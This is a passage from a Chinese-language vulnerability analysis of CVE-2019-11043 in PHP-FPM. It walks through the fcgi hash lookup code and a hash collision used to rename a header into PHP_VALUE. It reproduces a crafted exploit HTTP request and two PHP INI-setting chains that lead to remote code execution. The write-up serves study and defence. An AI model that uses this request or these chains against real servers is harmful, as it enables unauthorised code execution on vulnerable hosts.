fcgi_quick_getenv(fcgi_request *req, const char* var, int var_len, unsigned
int hash_value) { unsigned int val_len; return fcgi_hash_get(&req->env,
hash_value, (char*)var, var_len, &val_len); } static char
*fcgi_hash_get(fcgi_hash *h, unsigned int hash_value, char *var, unsigned int
var_len, unsigned int *val_len) { unsigned int idx = hash_value &
FCGI_HASH_TABLE_MASK; fcgi_hash_bucket *p = h->hash_table[idx]; while (p !=
NULL) { if (p->hash_value == hash_value && p->var_len == var_len &&
memcmp(p->var, var, var_len) == 0) { *val_len = p->val_len; return p->val; } p
= p->next; } return NULL; }

看到这里，hashtable 的作用发挥出来了，先以 hash_value 为索引查一下，再比较 var 的值是否相同，很严格。

要想写进去的 PHP_VALUE 能用起来的话，还有个问题没有解决，hash_value 对不上，曲线救国！

整理一下我们现在有哪些条件了：

  * hash_value 的计算很简单，非常容易产生一样的值。  

  * 对在 fcgi_data_seg 中存储的参数可以直接写入或者覆盖。  

利用哈希函数的缺陷，先搞一个进哈希表，去占个位，再通过 memcpy 进行更名。

FCGI_HASH("HTTP_EBUT") == FCGI_HASH("PHP_VALUE") == 2015 strlen("HTTP_EBUT")
== strlen("PHP_VALUE") == 9

怎么知道多久才覆盖成功了？写入 session.auto_start=1。

当服务器返回 Set-Cookie 头的时候，就说明了 PHP_VALUE 覆盖成功了。

GET /index.php/PHP_VALUE%0Asession.auto_start=1;;;?QQQQQQQQQQQQQQQQQQQQQ....
HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 D-Pisos:
8===========================================================D Ebut: mamku
tvoyu

其中 D-Pisos 是拿来调节位置的，结合上面打印的 request->env->data 内存更容易看清楚。

另外，我觉得 PHP_VALUE 的值可以直接从 Ebut 写入，只要把 HTTP_EBUT 换成 PHP_VALUE，不用整个覆盖。

怎么 RCE？

作者想到了这样的一条链，需要注意的是，为了将空字节准确地放置在地址中，偏移的值固定为 34，所以不能超过，少了就用
;填充。进一步的实现细节建议直接去看作者的 exp。

var chain = []string{ "short_open_tag=1", // 开启php短标签 "html_errors=0", //
在错误信息中关闭HTML标签 "include_path=/tmp", // 包含路径 "auto_prepend_file=a", //
指定脚本执行前自动包含的文件 "log_errors=1", // 使能错误日志 "error_reporting=2", // 指定错误级别
"error_log=/tmp/a", // 错误日志记录文件 "extension_dir=\"<?=\\`\"", //
指定extension的加载目录 "extension=\"$_GET[a]\\`?>\"", // 指定加载的extension }

orange 给了这样的链。

inis = [ "error_reporting=2", "short_open_tag=1", "html_errors=0",
"log_errors=1", "output_handler=<?/*", "output_handler=*/`",
"output_handler=''", "extension_dir='`?>'", "extension=$_GET[a]", "error_log =
/tmp/l", "include_path=/tmp", ]

## 总结  

一步一步深挖，直到 RCE。真是化腐朽为神奇，钦佩这样的技术大佬。

## 参考  

<https://bugs.php.net/bug.php?id=78599>

<https://github.com/neex/phuip-fpizdam>

<https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/>

<https://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html>

<https://blog.wonderkun.cc/2019/10/27/php-fpm> RCE的POC的理解剖析(CVE-2019-11043)/

[全方位深度剖析PHP7底层源码-慕课网实战](https://coding.imooc.com/class/312.html)

[人类身份验证 - SegmentFault](https://segmentfault.com/a/1190000016868502)

<https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/>

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

